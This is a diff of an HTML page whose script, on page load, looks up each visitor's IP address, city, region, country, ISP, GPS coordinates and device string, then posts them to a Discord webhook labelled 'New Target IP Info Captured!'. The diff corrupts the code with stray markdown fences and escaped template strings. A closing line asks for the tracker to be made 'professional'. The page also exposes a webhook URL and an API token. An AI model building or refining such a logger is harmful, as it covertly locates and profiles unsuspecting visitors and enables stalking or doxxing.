@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -9,39 +10,46 @@
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1365943749418684436/a92zO8H5VDyeY1Emq_3vXGYn3cvawfRgGkkt3Y7yZ05ooubEatnxu-fjiyfaUujNmLzx";
 
-    function sendToDiscord(message) {
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ content: message })
-      });
-    }
+```
+function sendToDiscord(message) {
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ content: message })
+  });
+}
 
-    function getIPDetails() {
-      fetch("https://ipinfo.io/json?token=01c58b3f834f30") // Free API, no login needed
-        .then(response => response.json())
-        .then(data => {
-          const message = `
+function getIPDetails() {
+  fetch("https://ipinfo.io/json?token=01c58b3f834f30") // Free API, no login needed
+    .then(response => response.json())
+    .then(data => {
+      const message = `
+```
+
 🌐 **New Target IP Info Captured!**
-🔢 **IP:** ${data.ip}
-🏙️ **City:** ${data.city}
-🌍 **Region:** ${data.region}
-🌎 **Country:** ${data.country}
-📡 **ISP:** ${data.org}
-🧭 **Location (Lat,Long):** ${data.loc}
-🔗 **Google Maps:** https://www.google.com/maps?q=${data.loc}
-📱 **Device:** ${navigator.userAgent}
-          `;
-          sendToDiscord(message);
-        })
-        .catch(error => {
-          sendToDiscord("[!] Failed to fetch IP details: " + error);
-        });
-    }
+🔢 **IP:** \${data.ip}
+🏙️ **City:** \${data.city}
+🌍 **Region:** \${data.region}
+🌎 **Country:** \${data.country}
+📡 **ISP:** \${data.org}
+🧭 **Location (Lat,Long):** \${data.loc}
+🔗 **Google Maps:** [https://www.google.com/maps?q=\${data.loc}](https://www.google.com/maps?q=${data.loc})
+📱 **Device:** \${navigator.userAgent}
+\`;
+sendToDiscord(message);
+})
+.catch(error => {
+sendToDiscord("\[!] Failed to fetch IP details: " + error);
+});
+}
 
-    getIPDetails();
+```
+getIPDetails();
+```
+
   </script>
 </body>
 </html>
+modify it and make it by a professional
